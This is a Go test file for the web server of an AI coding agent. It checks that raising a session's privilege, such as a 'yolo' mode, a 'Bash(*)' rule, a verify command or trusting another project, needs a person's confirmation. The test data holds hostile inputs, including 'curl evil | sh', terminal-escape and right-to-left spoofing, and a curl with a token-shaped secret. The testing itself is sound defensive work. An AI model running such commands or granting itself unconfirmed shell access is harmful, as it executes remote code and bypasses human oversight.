package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/anemos-labs/sleipnir/internal/perm"
	"github.com/anemos-labs/sleipnir/internal/provider/mock"
	"github.com/anemos-labs/sleipnir/internal/web"
	"github.com/anemos-labs/sleipnir/internal/web/wire"
)

// confirmFor asks the server for a confirmation id of a scope, as the page does when the person confirms.
func (r *webRig) confirmFor(scope string) string {
	r.t.Helper()
	var c wire.ConfirmID
	r.json("POST", "/api/confirm", wire.ConfirmRequest{Scope: scope}, 200, &c)
	return c.ID
}

// needsConfirm sends a request that must be refused for want of a confirmation and returns the scope the refusal names.
func (r *webRig) needsConfirm(method, path string, body any) string {
	r.t.Helper()
	req := func() (*http.Response, []byte) {
		code, b := r.do(method, path, body)
		return &http.Response{StatusCode: code}, b
	}
	resp, b := req()
	var e struct {
		Code   string
		Detail struct {
			Scope   string
			Reasons []string
		}
	}
	if resp.StatusCode != http.StatusPreconditionRequired || json.Unmarshal(b, &e) != nil || e.Code != "confirm_required" || e.Detail.Scope == "" || len(e.Detail.Reasons) == 0 {
		r.t.Fatalf("%s %s without a confirmation = %d %s, want 428 confirm_required with a scope and its reasons", method, path, resp.StatusCode, b)
	}
	return e.Detail.Scope
}

// mode is the permission mode of a tab's session now.
func (r *webRig) mode(id string) string { return string(r.h.tab(id).session().Perm.Mode()) }

// What raises a session's privilege is confirmed where it takes effect, whichever way it is asked for: a slash line through the
// command route needs the same confirmation as the dedicated route, and without it nothing changes.
func TestPrivilegeIsConfirmedWhereItTakesEffect(t *testing.T) {
	project := webWorld(t)
	_, base := newWebModel(t, sayScript("ok"))
	r := newWebRig(t, soloDefaults(project), base)
	tab := r.ready("")
	path := "/api/sessions/" + tab.ID

	scope := r.needsConfirm("POST", path+"/command", wire.CommandRequest{Line: "/mode yolo"})
	if scope != "mode:yolo:"+tab.ID || r.mode(tab.ID) != "accept-edits" {
		t.Fatalf("/mode yolo: scope %q, mode %s", scope, r.mode(tab.ID))
	}
	if code, body := r.do("POST", path+"/command", wire.CommandRequest{Line: "/mode yolo"}, web.ConfirmHeader, "not-an-id"); code != 403 || r.mode(tab.ID) == "yolo" {
		t.Errorf("/mode yolo with a bad confirmation = %d %s, mode %s", code, body, r.mode(tab.ID))
	}
	if code, body := r.do("POST", path+"/command", wire.CommandRequest{Line: "/mode yolo"}, web.ConfirmHeader, r.confirmFor(scope)); code != 200 || r.mode(tab.ID) != "yolo" {
		t.Errorf("/mode yolo confirmed = %d %s, mode %s", code, body, r.mode(tab.ID))
	}
	if code, _ := r.do("POST", path+"/mode", wire.ModeRequest{Mode: "default"}); code != 200 {
		t.Errorf("a safer mode = %d", code)
	}

	allow := r.needsConfirm("POST", path+"/command", wire.CommandRequest{Line: "/allow Bash(*)"})
	if slices.Contains(r.h.tab(tab.ID).session().Perm.Rules(perm.Allow), "Bash(*)") {
		t.Fatal("/allow Bash(*) took effect without its confirmation")
	}
	if code, body := r.do("POST", path+"/rules", wire.RuleRequest{Effect: "allow", Rule: "Bash(*)"}, web.ConfirmHeader, r.confirmFor(allow)); code != 200 {
		t.Errorf("the same rule through the rules route with the command's confirmation = %d %s", code, body)
	}
	if code, _ := r.do("POST", path+"/rules", wire.RuleRequest{Effect: "allow", Rule: "Bash(*)"}); code != 200 {
		t.Errorf("an allow rule the session already has needs no confirmation: %d", code)
	}
	r.needsConfirm("POST", path+"/rules", wire.RuleRequest{Effect: "allow", Rule: "tests"})
	r.json("POST", path+"/rules", wire.RuleRequest{Effect: "deny", Rule: "Bash(rm:*)"}, 200, nil)
	r.needsConfirm("POST", path+"/rules/remove", wire.RuleRequest{Effect: "deny", Rule: "Bash(rm:*)"})

	r.needsConfirm("POST", path+"/command", wire.CommandRequest{Line: "/restart --mode yolo"})
	r.needsConfirm("POST", path+"/command", wire.CommandRequest{Line: "/swarm 2 --verify 'sh x.sh'"})
	r.needsConfirm("POST", path+"/restart", wire.RestartRequest{Kind: "restart", Flags: []string{"--mode", "bypass"}})
	r.needsConfirm("POST", path+"/command", wire.CommandRequest{Line: "/rewind cp_0001"})
	if g := r.h.tab(tab.ID).Summary().Gen; g != 1 {
		t.Errorf("a restart took place without its confirmation: gen %d", g)
	}
}

// A restart is authorized on the arguments it starts with: flags staged earlier (trust, a verify command) need the confirmation at
// the restart that applies them; a boolean flag is read as the flag package reads it (--trust-project=True); a directory that is
// not a project of the server is refused; a confirmation is good for exactly what it was asked for.
func TestRestartsAreAuthorizedOnTheirFinalArguments(t *testing.T) {
	project := webWorld(t)
	if err := os.WriteFile(filepath.Join(project, "AGENTS.md"), []byte("the project's own instructions\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	_, base := newWebModel(t, sayScript("ok"))
	base.TrustProject = false
	r := newWebRig(t, soloDefaults(project), base)
	tab := r.ready("")
	path := "/api/sessions/" + tab.ID

	on := true
	r.json("PATCH", path+"/launch", wire.LaunchPatch{TrustProject: &on}, 200, nil)
	scope := r.needsConfirm("POST", path+"/restart", wire.RestartRequest{Kind: "restart"})
	if !strings.HasPrefix(scope, "restart:"+tab.ID+":") {
		t.Errorf("scope %q", scope)
	}
	id := r.confirmFor(scope)
	verify := "sh verify.sh"
	r.json("PATCH", path+"/launch", wire.LaunchPatch{Verify: &verify}, 200, nil)
	if code, _ := r.do("POST", path+"/restart", wire.RestartRequest{Kind: "restart"}, web.ConfirmHeader, id); code != 403 {
		t.Errorf("a confirmation of a restart that now also runs a verify command = %d, want 403", code)
	}
	if g := r.h.tab(tab.ID).Summary().Gen; g != 1 {
		t.Fatalf("restarted without a confirmation: gen %d", g)
	}
	off := false
	r.json("PATCH", path+"/launch", wire.LaunchPatch{TrustProject: &off}, 200, nil)
	empty := ""
	r.json("PATCH", path+"/launch", wire.LaunchPatch{Verify: &empty}, 200, nil)
	r.needsConfirm("POST", path+"/restart", wire.RestartRequest{Kind: "restart", Flags: []string{"--trust-project=True"}})
	elsewhere := t.TempDir()
	if code, body := r.do("POST", path+"/restart", wire.RestartRequest{Kind: "restart", Flags: []string{"--cwd", elsewhere, "--trust-project=True"}}); code != 403 || !strings.Contains(string(body), "not_a_project") {
		t.Errorf("a restart into a directory that is not a project = %d %s", code, body)
	}
	if code, body := r.do("POST", path+"/command", wire.CommandRequest{Line: "/restart --cwd " + elsewhere}); code != 403 || !strings.Contains(string(body), "not_a_project") {
		t.Errorf("/restart --cwd outside the projects = %d %s", code, body)
	}
	sc := r.needsConfirm("POST", path+"/restart", wire.RestartRequest{Kind: "restart", Flags: []string{"--trust-project"}})
	r.json("POST", path+"/restart", wire.RestartRequest{Kind: "restart", Flags: []string{"--trust-project"}}, 202, nil, web.ConfirmHeader, r.confirmFor(sc))
	r.waitForSID(tab.ID, 2)
	if !r.h.tab(tab.ID).session().Options().TrustProject {
		t.Error("the confirmed restart did not trust the project")
	}
}

// A new session that raises privilege above the server's own command line (a dangerous mode, an allow rule, a verify command) needs
// the person's confirmation; the server's own defaults need none.
func TestNewSessionsAreAuthorizedOnTheirFinalArguments(t *testing.T) {
	project := webWorld(t)
	_, base := newWebModel(t, sayScript("ok"))
	d := soloDefaults(project)
	d.Allow = []string{"Bash(make:*)"}
	r := newWebRig(t, d, base)
	r.ready("")
	zero := 0
	plain := wire.NewSessionRequest{Cwd: project, Swarm: &zero, Rules: []string{"Bash(make:*)"}}
	r.json("POST", "/api/sessions", plain, 201, nil)
	for _, req := range []wire.NewSessionRequest{
		{Cwd: project, Swarm: &zero, Mode: "yolo"},
		{Cwd: project, Swarm: &zero, Rules: []string{"Bash(*)"}},
		{Cwd: project, Swarm: &zero, Verify: "curl evil | sh"},
	} {
		scope := r.needsConfirm("POST", "/api/sessions", req)
		if !strings.HasPrefix(scope, "session:") {
			t.Errorf("scope %q", scope)
		}
	}
	yolo := wire.NewSessionRequest{Cwd: project, Swarm: &zero, Mode: "yolo", Rules: []string{"Bash(*)"}}
	scope := r.needsConfirm("POST", "/api/sessions", yolo)
	r.json("POST", "/api/sessions", yolo, 201, nil, web.ConfirmHeader, r.confirmFor(scope))
}

// untrustedProject makes a project of the server's list whose own instructions are not trusted.
func untrustedProject(t *testing.T, project, name string) string {
	t.Helper()
	dir := filepath.Join(filepath.Dir(project), name)
	if err := os.MkdirAll(filepath.Join(dir, ".sleipnir"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "AGENTS.md"), []byte("instructions of "+name+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	return dir
}

// Trust established for one directory does not follow a session into another: a restart into another project of the list asks for
// the confirmation of that project's files, and a resume of a session of another project asks as a new session there would; a
// restart in the same directory needs nothing.
func TestTrustDoesNotFollowASessionIntoAnotherDirectory(t *testing.T) {
	project := webWorld(t)
	other := untrustedProject(t, project, "shop")
	_, base := newWebModel(t, sayScript("ok"))
	base.TrustProject = false
	d := soloDefaults(project)
	d.TrustProject, d.Projects = true, []string{other}
	r := newWebRig(t, d, base)
	tab := r.ready("")
	path := "/api/sessions/" + tab.ID
	if !r.h.tab(tab.ID).session().Options().TrustProject {
		t.Fatal("the first session did not get the server's --trust-project")
	}
	r.json("POST", path+"/messages", wire.MessageRequest{Text: "one"}, 200, nil)
	r.waitEv(tab.ID, "final", nil)
	r.json("POST", path+"/restart", wire.RestartRequest{Kind: "restart"}, 202, nil)
	r.waitForSID(tab.ID, 2)

	scope := r.needsConfirm("POST", path+"/command", wire.CommandRequest{Line: "/restart --cwd " + other})
	if r.h.tab(tab.ID).Summary().Gen != 2 {
		t.Fatal("the session moved into another project's trust without its confirmation")
	}
	r.json("POST", path+"/command", wire.CommandRequest{Line: "/restart --cwd " + other}, 200, nil, web.ConfirmHeader, r.confirmFor(scope))
	r.waitForSID(tab.ID, 3)
	if s := r.h.tab(tab.ID).session(); s.Cwd() != other || !s.Options().TrustProject {
		t.Errorf("the confirmed restart: cwd %s trusted %v", s.Cwd(), s.Options().TrustProject)
	}

	// A recorded session of the other project, resumed with the server's --trust-project, shows the files first.
	zero := 0
	var created struct{ Tab wire.TabSummary }
	r.json("POST", "/api/sessions", wire.NewSessionRequest{Cwd: other, Swarm: &zero}, 201, &created)
	rec := r.ready(created.Tab.ID)
	r.json("POST", "/api/sessions/"+rec.ID+"/messages", wire.MessageRequest{Text: "two"}, 200, nil)
	r.waitEv(rec.ID, "final", nil)
	if s := r.h.tab(rec.ID).session(); s.Options().TrustProject {
		t.Fatal("a session started without trust in its project was trusted")
	}
	r.json("DELETE", "/api/sessions/"+rec.ID, nil, 200, nil)
	code, body := r.do("POST", "/api/sessions/resume", wire.ResumeRequest{From: rec.SID})
	var e struct {
		Code   string
		Detail wire.TrustChallenge
	}
	if code != 409 || json.Unmarshal(body, &e) != nil || e.Code != "trust_required" || len(e.Detail.Files) == 0 || e.Detail.Confirm == "" {
		t.Fatalf("resuming a session of an untrusted project with the server's --trust-project = %d %s", code, body)
	}
	r.json("POST", "/api/sessions/resume", wire.ResumeRequest{From: rec.SID}, 201, nil, web.ConfirmHeader, e.Detail.Confirm)
}

// A project whose own files cannot all be read (a settings file that is a link leaving the project) is never taken for one with
// nothing to trust: trusting it shows the challenge, which names what could not be read, and the projects list calls it partial.
func TestAPartlyUnreadableProjectIsNotTakenForAnEmptyOne(t *testing.T) {
	project := webWorld(t)
	sym := filepath.Join(filepath.Dir(project), "symproj")
	if err := os.MkdirAll(filepath.Join(sym, ".sleipnir"), 0o755); err != nil {
		t.Fatal(err)
	}
	outside := filepath.Join(t.TempDir(), "config.json")
	if err := os.WriteFile(outside, []byte(`{"permissions":{"allow":["Bash(touch:*)"]}}`), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(outside, filepath.Join(sym, ".sleipnir", "config.json")); err != nil {
		t.Skip("no symlinks here:", err)
	}
	_, base := newWebModel(t, sayScript("ok"))
	base.TrustProject = false
	d := soloDefaults(project)
	d.Projects = []string{sym}
	r := newWebRig(t, d, base)
	r.ready("")
	var projects struct{ Projects []wire.Project }
	r.json("GET", "/api/projects", nil, 200, &projects)
	for _, p := range projects.Projects {
		if p.Dir == sym && p.Trust != "partial" {
			t.Errorf("the projects list calls a partly unreadable project %q", p.Trust)
		}
	}
	zero := 0
	code, body := r.do("POST", "/api/sessions", wire.NewSessionRequest{Cwd: sym, Swarm: &zero, TrustProject: true})
	var e struct {
		Code   string
		Detail wire.TrustChallenge
	}
	if code != 409 || json.Unmarshal(body, &e) != nil || e.Code != "trust_required" || !e.Detail.Partial {
		t.Fatalf("trusting a partly unreadable project = %d %s", code, body)
	}
	found := false
	for _, f := range e.Detail.Files {
		found = found || (f.Kind == "unread" && f.Path == ".sleipnir/config.json")
	}
	if !found {
		t.Errorf("the challenge does not name what could not be read: %+v", e.Detail.Files)
	}
}

// What a confirmation raises is shown whole: a control character is an escape, never removed; a setting that cannot be shown whole
// (too long, or shaped like a secret) is refused instead of being confirmed half seen.
func TestConfirmationReasonsAreShownWhole(t *testing.T) {
	project := webWorld(t)
	_, base := newWebModel(t, sayScript("ok"))
	r := newWebRig(t, soloDefaults(project), base)
	r.ready("")
	zero := 0
	code, body := r.do("POST", "/api/sessions", wire.NewSessionRequest{Cwd: project, Swarm: &zero, Verify: "echo \x1b[2Jok ‮evil"})
	if code != 428 || !strings.Contains(string(body), `\\x1b[2Jok \\u202eevil`) {
		t.Errorf("a verify command with controls = %d %s, want them shown as escapes", code, body)
	}
	for _, v := range []string{strings.Repeat("x", maxReason+1), "curl -H 'Authorization: Bearer sk-ant-api03-" + strings.Repeat("A1b2C3d4", 6) + "' x"} {
		if code, body := r.do("POST", "/api/sessions", wire.NewSessionRequest{Cwd: project, Swarm: &zero, Verify: v}); code != 400 || !strings.Contains(string(body), "cannot be confirmed") {
			t.Errorf("a verify command that cannot be shown whole (%d bytes) = %d %s", len(v), code, body)
		}
	}
}

// The change a write asks to make is drawn against the file the write will change: through a link, the file it leads to; over a file
// that cannot be shown as text (not UTF-8), the question is not asked (it would otherwise be drawn as a new file).
func TestPendingChangesAreDrawnAgainstTheRealFile(t *testing.T) {
	project := webWorld(t)
	if err := os.WriteFile(filepath.Join(project, "real.txt"), []byte("the old line\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink("real.txt", filepath.Join(project, "link.txt")); err != nil {
		t.Skip("no symlinks here:", err)
	}
	if err := os.WriteFile(filepath.Join(project, "latin.txt"), []byte("caf\xe9 au lait\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	_, base := newWebModel(t, func(c *mock.Call) mock.Reply {
		target := "link.txt"
		if strings.Contains(c.LastUser(), "LATINWRITE") {
			target = "latin.txt"
		}
		since := 0 // the model's steps since the person's last message: read the file, then write it
		for _, m := range c.Messages {
			switch m.Role {
			case "user":
				since = 0
			case "assistant":
				since++
			}
		}
		switch since {
		case 0:
			return mock.Reply{ToolCalls: []mock.ToolCall{{ID: "r1", Name: "read", Args: `{"path":"` + target + `"}`}}}
		case 1:
			return mock.Reply{ToolCalls: []mock.ToolCall{{ID: "w1", Name: "write", Args: `{"path":"` + target + `","content":"the new line\n"}`}}}
		}
		return mock.Reply{Text: "done"}
	})
	d := soloDefaults(project)
	d.Mode = "default"
	r := newWebRig(t, d, base)
	tab := r.ready("")
	r.json("POST", "/api/sessions/"+tab.ID+"/messages", wire.MessageRequest{Text: "LINKWRITE"}, 200, nil)
	ask := r.waitEv(tab.ID, "ask", nil)
	change := fmt.Sprint(ask["q"].(map[string]any)["change"])
	if strings.Contains(change, "/dev/null") || !strings.Contains(change, "-the old line") || !strings.Contains(change, "+the new line") {
		t.Errorf("a write through a link is drawn as:\n%s", change)
	}
	r.json("POST", "/api/sessions/"+tab.ID+"/interrupt", map[string]string{"target": "turn"}, 200, nil)
	r.waitEv(tab.ID, "turn", map[string]any{"s": "end"})

	r.json("POST", "/api/sessions/"+tab.ID+"/messages", wire.MessageRequest{Text: "LATINWRITE"}, 200, nil)
	tool := r.waitEv(tab.ID, "tool", map[string]any{"name": "Write", "arg": "latin.txt"})
	if tool["refused"] != true || !strings.Contains(fmt.Sprint(tool["reason"]), "could not be shown") {
		t.Errorf("a write over a file that is not text: %v", tool)
	}
	var open struct{ Questions []wire.OpenQuestion }
	r.json("GET", "/api/questions", nil, 200, &open)
	if len(open.Questions) != 0 {
		t.Errorf("a question was asked about a change that cannot be shown: %+v", open.Questions)
	}
}
